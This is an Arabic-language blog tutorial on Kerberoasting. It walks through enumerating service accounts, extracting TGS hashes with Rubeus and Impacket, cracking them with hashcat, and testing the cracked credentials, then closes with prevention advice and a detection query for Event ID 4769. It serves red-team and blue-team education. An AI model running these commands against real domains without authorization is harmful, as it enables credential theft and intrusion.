---
layout: blog
title: "Kerberoasting: الدليل العملي لاستخراج بيانات الاعتماد من Active Directory"
date: 2026-04-11T05:57:21Z
category: "تقنية"
excerpt: "Kerberoasting هو هجوم كلاسيكي على بيئات Active Directory يستهدف Service Principal Names. لا يتطلب صلاحيات عالية، ولا يُحدث ضجة في السجلات. فقط حساب مستخدم عادي، وقليل من الصبر، وستحصل على Hashes جاهزة للتكسير."
read_time: 8
tags: ["Active Directory", "Kerberos", "Password Cracking", "Red Team", "Windows Security"]
slug: "kerberoasting-guide"
image: "/OffsecAR/assets/images/blogs/kerberoasting-guide.svg"
---

## الأساس النظري

Kerberos هو بروتوكول المصادقة الافتراضي في Active Directory. عندما يطلب مستخدم الوصول إلى خدمة معينة (SQL Server، IIS، إلخ)، يُصدر Domain Controller تذكرة TGS (Ticket Granting Service) مشفرة بكلمة مرور حساب الخدمة.

المشكلة؟ أي مستخدم مصادق يستطيع طلب هذه التذاكر. والأسوأ: التذكرة مشفرة بـ hash قابل للتكسير offline. إذا كانت كلمة مرور الخدمة ضعيفة، اللعبة انتهت.

الهجوم يستهدف حسابات الخدمات التي تملك SPN مسجلاً. هذه الحسابات غالباً ما تملك صلاحيات عالية (Domain Admin أحياناً) وكلمات مرور لا تتغير لسنوات.

## الاستطلاع والتعداد

أول خطوة: تحديد الحسابات التي تملك SPNs. نستخدم PowerShell أو أدوات LDAP للاستعلام.

```powershell
# PowerShell - استعلام بسيط
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# البحث عن حسابات محددة
setspn -Q */*
```

باستخدام Impacket من Linux:

```bash
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10
```

ابحث عن حسابات ذات صلاحيات مثيرة للاهتمام. حسابات الخدمات عادة تحمل أسماء مثل `svc_sql`، `svc_backup`، أو `admin_svc`. راجع العضوية في المجموعات.

## تنفيذ الهجوم

مع Rubeus (Windows)، العملية مباشرة:

```powershell
# طلب كل تذاكر TGS المتاحة
Rubeus.exe kerberoast /outfile:hashes.txt

# استهداف حساب محدد
Rubeus.exe kerberoast /user:svc_sql /simple

# تصفية حسابات admincount
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

من Linux باستخدام Impacket:

```bash
# استخراج الـ hashes مباشرة
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# حفظ في ملف بصيغة Hashcat
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile kerberoast_hashes.txt
```

الـ hash الناتج سيكون بصيغة:
```
$krb5tgs$23$*user$realm$service/hostname*$[hash_data]
```

## التكسير والاستغلال

الآن نملك Hashes بصيغة RC4 (Type 23) أو AES (Type 17/18). نستخدم Hashcat أو John.

```bash
# Hashcat - وضع Kerberoasting
hashcat -m 13100 hashes.txt rockyou.txt --force

# مع قواعد لزيادة الفعالية
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule

# John the Ripper
john --wordlist=rockyou.txt hashes.txt
```

استراتيجيات التكسير:
- ابدأ بـ wordlists شائعة (rockyou، SecLists)
- جرّب أنماط المؤسسة: `Company2023!`، `ServiceName123`
- استخدم mask attacks للأنماط المتوقعة: `?u?l?l?l?l?l?d?d?d?s`
- حسابات الخدمات القديمة غالباً لها كلمات مرور بسيطة

بعد الحصول على كلمة المرور، تحقق من صلاحيات الحساب:

```bash
# اختبار الوصول
crackmapexec smb 10.10.10.0/24 -u svc_sql -p 'cracked_password'

# التحقق من العضوية
net user svc_sql /domain
```

## الحماية والكشف

من جانب Blue Team، الكشف صعب لكنه ممكن:

**الوقاية:**
- كلمات مرور قوية (25+ حرف) لحسابات الخدمات
- استخدام Group Managed Service Accounts (gMSAs)
- تقليل عدد SPNs إلى الضروري فقط
- مراجعة دورية لحسابات الخدمات وصلاحياتها

**الكشف:**
- مراقبة Event ID 4769 (طلبات TGS)
- تنبيه عند طلب عدد كبير من TGS في فترة قصيرة
- فحص Encryption Type: RC4 مشبوه (0x17)
- استخدام أدوات مثل KerberosDetect أو Azure ATP

```powershell
# بناء استعلام للكشف
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4769} | 
  Where-Object {$_.Properties[8].Value -eq '0x17'} | 
  Group-Object {$_.Properties[0].Value} | 
  Where-Object {$_.Count -gt 10}
```

Honeypot accounts: أنشئ حسابات خدمة وهمية بـ SPNs وكلمات مرور معروفة. أي محاولة لاستخدامها تعني اختراق.

المفتاح: افترض أن المهاجم داخل الشبكة بالفعل. Kerberoasting لا يُكتشف بسهولة، لكن آثاره (استخدام حسابات مكسورة) تظهر لاحقاً.
